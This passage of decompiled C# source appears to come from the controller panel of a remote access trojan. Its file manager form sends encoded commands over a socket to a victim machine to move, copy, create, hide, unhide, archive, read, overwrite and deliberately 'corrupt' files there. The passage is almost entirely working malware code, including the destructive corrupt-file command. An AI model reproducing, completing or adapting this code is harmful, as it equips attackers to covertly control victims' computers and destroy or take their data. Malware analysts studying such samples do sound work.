					if (Operators.CompareString(listViewItem.Text, "..", false) == 0)
					{
						goto IL_5F;
					}
					if (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0)
					{
						goto IL_5F;
					}
					bool arg_60_0 = true;
					IL_60:
					if (arg_60_0)
					{
						text = text + ";" + listViewItem.ToolTipText;
						continue;
					}
					continue;
					IL_5F:
					arg_60_0 = false;
					goto IL_60;
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (Operators.CompareString(text, "", false) != 0)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = true;
			}
		}

		// Token: 0x06000447 RID: 1095 RVA: 0x000276E0 File Offset: 0x000258E0
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			string text = "";
			try
			{
				enumerator = this.L2.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					if (Operators.CompareString(listViewItem.Text, "..", false) == 0)
					{
						goto IL_5F;
					}
					if (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0)
					{
						goto IL_5F;
					}
					bool arg_60_0 = true;
					IL_60:
					if (arg_60_0)
					{
						text = text + ";" + listViewItem.ToolTipText;
						continue;
					}
					continue;
					IL_5F:
					arg_60_0 = false;
					goto IL_60;
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (Operators.CompareString(text, "", false) != 0)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = false;
			}
		}

		// Token: 0x06000448 RID: 1096 RVA: 0x000277BC File Offset: 0x000259BC
		private void PastToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.Flist, "", false) != 0)
			{
				if (this.isCut)
				{
					Client arg_8C_0 = this.sk;
					string[] array = new string[5];
					array[0] = "mv";
					array[1] = ima.Y;
					string[] arg_6F_0 = array;
					int arg_6F_1 = 2;
					string text = (this.TextBox1.Text + "\\").Replace("\\\\", "\\");
					arg_6F_0[arg_6F_1] = Fungsi.ENB(ref text);
					array[3] = ima.Y;
					array[4] = Fungsi.ENB(ref this.Flist);
					arg_8C_0.Send(string.Concat(array));
				}
				else
				{
					Client arg_FC_0 = this.sk;
					string[] array = new string[5];
					array[0] = "cp";
					array[1] = ima.Y;
					string[] arg_DF_0 = array;
					int arg_DF_1 = 2;
					string text = (this.TextBox1.Text + "\\").Replace("\\\\", "\\");
					arg_DF_0[arg_DF_1] = Fungsi.ENB(ref text);
					array[3] = ima.Y;
					array[4] = Fungsi.ENB(ref this.Flist);
					arg_FC_0.Send(string.Concat(array));
				}
			}
		}

		// Token: 0x06000449 RID: 1097 RVA: 0x000278CC File Offset: 0x00025ACC
		private void NewFolderToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Folder Name?", "New Folder", "New Folder", -1, -1);
			if (text.Length != 0)
			{
				Client arg_53_0 = this.sk;
				string arg_4E_0 = "nd";
				string arg_4E_1 = ima.Y;
				string text2 = this.TextBox1.Text + text;
				arg_53_0.Send(arg_4E_0 + arg_4E_1 + Fungsi.ENB(ref text2));
			}
		}

		// Token: 0x0600044A RID: 1098 RVA: 0x00027934 File Offset: 0x00025B34
		private void NewEmptyFileToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("File Name?", "New File", "New Text.txt", -1, -1);
			if (text.Length != 0)
			{
				Client arg_53_0 = this.sk;
				string arg_4E_0 = "nf";
				string arg_4E_1 = ima.Y;
				string text2 = this.TextBox1.Text + text;
				arg_53_0.Send(arg_4E_0 + arg_4E_1 + Fungsi.ENB(ref text2));
			}
		}

		// Token: 0x0600044B RID: 1099 RVA: 0x0002799C File Offset: 0x00025B9C
		private void CorruptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L2.SelectedItems.Count > 0)
			{
				string text = "crp";
				try
				{
					IEnumerator enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						string toolTipText = listViewItem.ToolTipText;
						listViewItem.ToolTipText = toolTipText;
						text = text + ima.Y + Fungsi.ENB(ref toolTipText);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x0600044C RID: 1100 RVA: 0x00027A44 File Offset: 0x00025C44
		private void UnrarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L2.SelectedItems.Count != 0)
			{
				ListViewItem listViewItem = this.L2.SelectedItems[0];
				string toolTipText = listViewItem.ToolTipText;
				listViewItem.ToolTipText = toolTipText;
				string s = string.Concat(new string[]
				{
					"unrar",
					ima.Y
				}) + Fungsi.ENB(ref toolTipText);
				this.sk.Send(s);
			}
		}

		// Token: 0x0600044D RID: 1101 RVA: 0x00027AC0 File Offset: 0x00025CC0
		private void RarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L2.SelectedItems.Count != 0)
			{
				string text = string.Concat(new string[]
				{
					"rar",
					ima.Y
				});
				string text2 = Interaction.InputBox("Enter Rar Name", string.Empty, new DirectoryInfo(this.TextBox1.Text).Name + ".rar", -1, -1);
				if (Operators.CompareString(text2, string.Empty, false) != 0)
				{
					TextBox textBox = this.TextBox1;
					string text3 = textBox.Text;
					textBox.Text = text3;
					text = string.Concat(new string[]
					{
						text,
						Fungsi.ENB(ref text2),
						ima.Y,
						Fungsi.ENB(ref text3),
						ima.Y
					});
					string str = "a -y \"" + text2 + "\"";
					try
					{
						IEnumerator enumerator = this.L2.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							str = str + " \"" + listViewItem.Text + "\"";
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					text += Fungsi.ENB(ref str);
					this.sk.Send(text);
				}
			}
		}

		// Token: 0x0600044E RID: 1102 RVA: 0x00027C38 File Offset: 0x00025E38
		private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L2.SelectedItems.Count > 0)
			{
				string text = "shd";
				try
				{
					IEnumerator enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						string toolTipText = listViewItem.ToolTipText;
						listViewItem.ToolTipText = toolTipText;
						text = text + ima.Y + Fungsi.ENB(ref toolTipText);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x0600044F RID: 1103 RVA: 0x00027CE0 File Offset: 0x00025EE0
		private void HiddenToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.L2.SelectedItems.Count > 0)
			{
				string text = "hd";
				try
				{
					IEnumerator enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						string toolTipText = listViewItem.ToolTipText;
						listViewItem.ToolTipText = toolTipText;
						text = text + ima.Y + Fungsi.ENB(ref toolTipText);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x06000450 RID: 1104 RVA: 0x00027D88 File Offset: 0x00025F88
		private void OpenFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				Process.Start(Application.StartupPath + "\\Downloads");
			}
			catch (Exception expr_18)
			{
				ProjectData.SetProjectError(expr_18);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000451 RID: 1105 RVA: 0x00027DCC File Offset: 0x00025FCC
		private void L2_DoubleClick(object sender, EventArgs e)
		{
			if (this.L2.SelectedItems.Count != 0)
			{
				if (Operators.CompareString(this.L2.SelectedItems[0].SubItems[2].Text, "DIR", false) == 0)
				{
					this.exp(this.L2.SelectedItems[0].ToolTipText, false);
				}
				else
				{
					ListViewItem listViewItem = this.L2.SelectedItems[0];
					string toolTipText = listViewItem.ToolTipText;
					listViewItem.ToolTipText = toolTipText;
					this.sk.Send("rd" + ima.Y + Fungsi.ENB(ref toolTipText));
				}
			}
		}

		// Token: 0x06000452 RID: 1106 RVA: 0x00027E88 File Offset: 0x00026088
		private void L2_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.P.Image = null;
			this.P.Visible = false;
			if (this.L2.SelectedItems.Count == 1)
			{
				ListViewItem listViewItem = this.L2.SelectedItems[0];
				if (this.Images.Contains(listViewItem.ToolTipText))
				{
					this.P.Image = (Image)this.Images[listViewItem.ToolTipText];
					this.P.Visible = true;
				}
				else if (".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(listViewItem.SubItems[2].Text.ToLower()))
				{
					ListViewItem listViewItem2 = listViewItem;
					string toolTipText = listViewItem2.ToolTipText;
					listViewItem2.ToolTipText = toolTipText;
					this.sk.Send("#" + ima.Y + Fungsi.ENB(ref toolTipText));
				}
				else if (!this.SplitContainer2.Panel2Collapsed && this.L2.SelectedItems.Count > 0)
				{
					IEnumerator enumerator = null;
					string text = "rd";
					try
					{
						enumerator = this.L2.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem3 = (ListViewItem)enumerator.Current;
							if (Operators.CompareString(listViewItem3.SubItems[2].Text, "DIR", false) != 0)
							{
								ListViewItem listViewItem4 = listViewItem3;
								string toolTipText2 = listViewItem4.ToolTipText;
								listViewItem4.ToolTipText = toolTipText2;
								text = text + ima.Y + Fungsi.ENB(ref toolTipText2);
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					this.sk.Send(text);
				}
			}
		}

		// Token: 0x06000453 RID: 1107 RVA: 0x00028058 File Offset: 0x00026258
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string[] array = new string[5];
			array[0] = "wr";
			array[1] = ima.Y;
			string[] arg_33_0 = array;
			int arg_33_1 = 2;
			string fNN = Conversions.ToString(this.FNN);
			string arg_33_2 = Fungsi.ENB(ref fNN);
			this.FNN = fNN;
			arg_33_0[arg_33_1] = arg_33_2;
			array[3] = ima.Y;
			RichTextBox richTextBox = this.RichTextBox1;
			string text = richTextBox.Text;
			richTextBox.Text = text;
			array[4] = Fungsi.ENB(ref text);
			this.sk.Send(string.Concat(array));
		}

		// Token: 0x06000454 RID: 1108 RVA: 0x00003639 File Offset: 0x00001839
		private void SellectAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RichTextBox1.SelectAll();
		}

		// Token: 0x06000455 RID: 1109 RVA: 0x00003646 File Offset: 0x00001846
		private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.RichTextBox1.Cut();
		}

		// Token: 0x06000456 RID: 1110 RVA: 0x00003653 File Offset: 0x00001853
		private void CopyToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.RichTextBox1.Copy();
		}

		// Token: 0x06000457 RID: 1111 RVA: 0x00003660 File Offset: 0x00001860
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RichTextBox1.Paste();
		}

		// Token: 0x06000458 RID: 1112 RVA: 0x0000366D File Offset: 0x0000186D
		private void ToolStripButton2_Click(object sender, EventArgs e)
		{
			this.ToolStripButton2.Checked = true;
			this.ToolStripButton4.Checked = false;
			this.ToolStripButton3.Checked = false;
			this.L2.View = View.Details;
		}

		// Token: 0x06000459 RID: 1113 RVA: 0x0000369F File Offset: 0x0000189F
		private void ToolStripButton3_Click(object sender, EventArgs e)
		{
			this.L2.View = View.List;
			this.ToolStripButton2.Checked = false;
			this.ToolStripButton4.Checked = false;
			this.ToolStripButton3.Checked = true;
		}

		// Token: 0x0600045A RID: 1114 RVA: 0x000036D1 File Offset: 0x000018D1
		private void ToolStripButton4_Click(object sender, EventArgs e)
		{
			this.ToolStripButton4.Checked = true;
			this.ToolStripButton2.Checked = false;
			this.ToolStripButton3.Checked = false;
			this.L2.View = View.LargeIcon;
		}

		// Token: 0x0600045B RID: 1115 RVA: 0x00003703 File Offset: 0x00001903
		private void L1_DoubleClick(object sender, EventArgs e)
		{
			if (this.L1.SelectedItems.Count != 0)
			{
				this.exp(this.L1.SelectedItems[0].ToolTipText, false);
			}
		}

		// Token: 0x0600045C RID: 1116 RVA: 0x000280D4 File Offset: 0x000262D4
		private void ToolStripButton1_Click_1(object sender, EventArgs e)
		{
			if (this.ToolStripButton1.Checked)
			{
				this.SplitContainer2.Panel2Collapsed = true;
				this.ToolStripButton1.Checked = false;
				this.ToolStripButton1.Image = Resources.application_sidebar_collapse;
				this.L2.FX();
			}
			else
			{
				this.ToolStripButton1.Checked = true;
				this.SplitContainer2.Panel2Collapsed = false;
				this.ToolStripButton1.Image = Resources.application_sidebar_expand;
				this.L2.FX();
			}
		}

		// Token: 0x040001C0 RID: 448
		private static List<WeakReference> __ENCList;

		// Token: 0x040001C2 RID: 450
		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		// Token: 0x040001C3 RID: 451
		[AccessedThroughProperty("SL")]
		private ToolStripStatusLabel _SL;

		// Token: 0x040001C4 RID: 452
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x040001C5 RID: 453
		[AccessedThroughProperty("RefreshToolStripMenuItem")]
		private ToolStripMenuItem _RefreshToolStripMenuItem;

		// Token: 0x040001C6 RID: 454
		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		// Token: 0x040001C7 RID: 455
		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip _ContextMenuStrip2;

		// Token: 0x040001C8 RID: 456
		[AccessedThroughProperty("UPToolStripMenuItem")]
		private ToolStripMenuItem _UPToolStripMenuItem;

		// Token: 0x040001C9 RID: 457
		[AccessedThroughProperty("RefreshToolStripMenuItem1")]
		private ToolStripMenuItem _RefreshToolStripMenuItem1;

		// Token: 0x040001CA RID: 458
		[AccessedThroughProperty("RunToolStriplistviewMenuItem")]
		private ToolStripMenuItem _RunToolStriplistviewMenuItem;

		// Token: 0x040001CB RID: 459
		[AccessedThroughProperty("DeleteToolStripMenuItem")]
		private ToolStripMenuItem _DeleteToolStripMenuItem;

		// Token: 0x040001CC RID: 460
		[AccessedThroughProperty("EditToolStripMenuItem")]
		private ToolStripMenuItem _EditToolStripMenuItem;

		// Token: 0x040001CD RID: 461
		[AccessedThroughProperty("RenameToolStripMenuItem")]
		private ToolStripMenuItem _RenameToolStripMenuItem;

		// Token: 0x040001CE RID: 462
		[AccessedThroughProperty("DownloadToolStripMenuItem")]
		private ToolStripMenuItem _DownloadToolStripMenuItem;

		// Token: 0x040001CF RID: 463
		[AccessedThroughProperty("UploadToolStripMenuItem")]
		private ToolStripMenuItem _UploadToolStripMenuItem;

		// Token: 0x040001D0 RID: 464
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x040001D1 RID: 465
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x040001D2 RID: 466
		[AccessedThroughProperty("PictureBox2")]
		private PictureBox _PictureBox2;

		// Token: 0x040001D3 RID: 467
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x040001D4 RID: 468
		[AccessedThroughProperty("RunToolStripMenuItem")]
		private ToolStripMenuItem _RunToolStripMenuItem;

		// Token: 0x040001D5 RID: 469
		[AccessedThroughProperty("pr")]
		private CHProgressbar _pr;

		// Token: 0x040001D6 RID: 470
		[AccessedThroughProperty("SplitContainer1")]
		private SplitContainer _SplitContainer1;

		// Token: 0x040001D7 RID: 471
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x040001D8 RID: 472
		[AccessedThroughProperty("SplitContainer2")]
		private SplitContainer _SplitContainer2;

		// Token: 0x040001D9 RID: 473
		[AccessedThroughProperty("L2")]
		private LV _L2;

		// Token: 0x040001DA RID: 474
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x040001DB RID: 475
		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		// Token: 0x040001DC RID: 476
		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		// Token: 0x040001DD RID: 477
		[AccessedThroughProperty("RichTextBox1")]
		private RichTextBox _RichTextBox1;

		// Token: 0x040001DE RID: 478
		[AccessedThroughProperty("HiddenToolStripMenuItem")]
		private ToolStripMenuItem _HiddenToolStripMenuItem;

		// Token: 0x040001DF RID: 479
		[AccessedThroughProperty("ShowToolStripMenuItem")]
		private ToolStripMenuItem _ShowToolStripMenuItem;

		// Token: 0x040001E0 RID: 480
		[AccessedThroughProperty("HiddenToolStripMenuItem1")]
		private ToolStripMenuItem _HiddenToolStripMenuItem1;

		// Token: 0x040001E1 RID: 481
		[AccessedThroughProperty("UnrarToolStripMenuItem")]
		private ToolStripMenuItem _UnrarToolStripMenuItem;

		// Token: 0x040001E2 RID: 482
		[AccessedThroughProperty("RarToolStripMenuItem")]
		private ToolStripMenuItem _RarToolStripMenuItem;

		// Token: 0x040001E3 RID: 483
		[AccessedThroughProperty("ToolStripSeparator1")]
		private ToolStripSeparator _ToolStripSeparator1;

		// Token: 0x040001E4 RID: 484
		[AccessedThroughProperty("StripToolStripMenuItem")]
		private ToolStripSeparator _StripToolStripMenuItem;

		// Token: 0x040001E5 RID: 485
		[AccessedThroughProperty("ToolStripSeparator2")]
		private ToolStripSeparator _ToolStripSeparator2;

		// Token: 0x040001E6 RID: 486
		[AccessedThroughProperty("CutToolStripMenuItem")]
		private ToolStripMenuItem _CutToolStripMenuItem;

		// Token: 0x040001E7 RID: 487
		[AccessedThroughProperty("CopyToolStripMenuItem")]
		private ToolStripMenuItem _CopyToolStripMenuItem;

		// Token: 0x040001E8 RID: 488
		[AccessedThroughProperty("PastToolStripMenuItem")]
		private ToolStripMenuItem _PastToolStripMenuItem;

		// Token: 0x040001E9 RID: 489
		[AccessedThroughProperty("NewFolderToolStripMenuItem")]
		private ToolStripMenuItem _NewFolderToolStripMenuItem;

		// Token: 0x040001EA RID: 490
		[AccessedThroughProperty("NewFolderToolStripMenuItem1")]
		private ToolStripMenuItem _NewFolderToolStripMenuItem1;

		// Token: 0x040001EB RID: 491
		[AccessedThroughProperty("NewEmptyFileToolStripMenuItem1")]
		private ToolStripMenuItem _NewEmptyFileToolStripMenuItem1;

		// Token: 0x040001EC RID: 492
		[AccessedThroughProperty("CorruptToolStripMenuItem")]
		private ToolStripMenuItem _CorruptToolStripMenuItem;

		// Token: 0x040001ED RID: 493
		[AccessedThroughProperty("ToolStripSeparator3")]
		private ToolStripSeparator _ToolStripSeparator3;

		// Token: 0x040001EE RID: 494
		[AccessedThroughProperty("ToolStripSeparator4")]
		private ToolStripSeparator _ToolStripSeparator4;

		// Token: 0x040001EF RID: 495
		[AccessedThroughProperty("ToolStripSeparator5")]
		private ToolStripSeparator _ToolStripSeparator5;

		// Token: 0x040001F0 RID: 496
		[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
		private ToolStripMenuItem _OpenFolderToolStripMenuItem;

		// Token: 0x040001F1 RID: 497
		[AccessedThroughProperty("ContextMenuStrip3")]
		private ContextMenuStrip _ContextMenuStrip3;

		// Token: 0x040001F2 RID: 498
		[AccessedThroughProperty("SaveToolStripMenuItem")]
		private ToolStripMenuItem _SaveToolStripMenuItem;

		// Token: 0x040001F3 RID: 499
		[AccessedThroughProperty("AToolStripMenuItem")]
		private ToolStripSeparator _AToolStripMenuItem;

		// Token: 0x040001F4 RID: 500
		[AccessedThroughProperty("SellectAllToolStripMenuItem")]
		private ToolStripMenuItem _SellectAllToolStripMenuItem;

		// Token: 0x040001F5 RID: 501
		[AccessedThroughProperty("ToolStripSeparator7")]
		private ToolStripSeparator _ToolStripSeparator7;

		// Token: 0x040001F6 RID: 502
		[AccessedThroughProperty("CutToolStripMenuItem1")]
		private ToolStripMenuItem _CutToolStripMenuItem1;

		// Token: 0x040001F7 RID: 503
		[AccessedThroughProperty("CopyToolStripMenuItem1")]
		private ToolStripMenuItem _CopyToolStripMenuItem1;

		// Token: 0x040001F8 RID: 504
		[AccessedThroughProperty("PasteToolStripMenuItem")]
		private ToolStripMenuItem _PasteToolStripMenuItem;

		// Token: 0x040001F9 RID: 505
		[AccessedThroughProperty("ToolStrip1")]
		private ToolStrip _ToolStrip1;

		// Token: 0x040001FA RID: 506
		[AccessedThroughProperty("ToolStripButton2")]
		private ToolStripButton _ToolStripButton2;

		// Token: 0x040001FB RID: 507
		[AccessedThroughProperty("ToolStripButton3")]
		private ToolStripButton _ToolStripButton3;

		// Token: 0x040001FC RID: 508
		[AccessedThroughProperty("ToolStripButton4")]
		private ToolStripButton _ToolStripButton4;

		// Token: 0x040001FD RID: 509
		[AccessedThroughProperty("ToolStripSeparator6")]
		private ToolStripSeparator _ToolStripSeparator6;

		// Token: 0x040001FE RID: 510
		[AccessedThroughProperty("ToolStripButton1")]
		private ToolStripButton _ToolStripButton1;

		// Token: 0x040001FF RID: 511
		[AccessedThroughProperty("L1")]
		private LV _L1;

		// Token: 0x04000200 RID: 512
		[AccessedThroughProperty("ColumnHeader6")]
		private ColumnHeader _ColumnHeader6;

		// Token: 0x04000201 RID: 513
		[AccessedThroughProperty("ColumnHeader8")]
		private ColumnHeader _ColumnHeader8;

		// Token: 0x04000202 RID: 514
		[AccessedThroughProperty("MG")]
		private ImageList _MG;

		// Token: 0x04000203 RID: 515
		[AccessedThroughProperty("MG2")]
		private ImageList _MG2;

		// Token: 0x04000204 RID: 516
		public Collection Cache;

		// Token: 0x04000205 RID: 517
		public Collection Images;

		// Token: 0x04000206 RID: 518
		public Client osk;

		// Token: 0x04000207 RID: 519
		public PictureBox P;

		// Token: 0x04000208 RID: 520
		public string QQ;

		// Token: 0x04000209 RID: 521
		public Client sk;

		// Token: 0x0400020A RID: 522
		public bool isCut;

		// Token: 0x0400020B RID: 523
		public string Flist;

		// Token: 0x0400020C RID: 524
		public string FNN;
	}
}
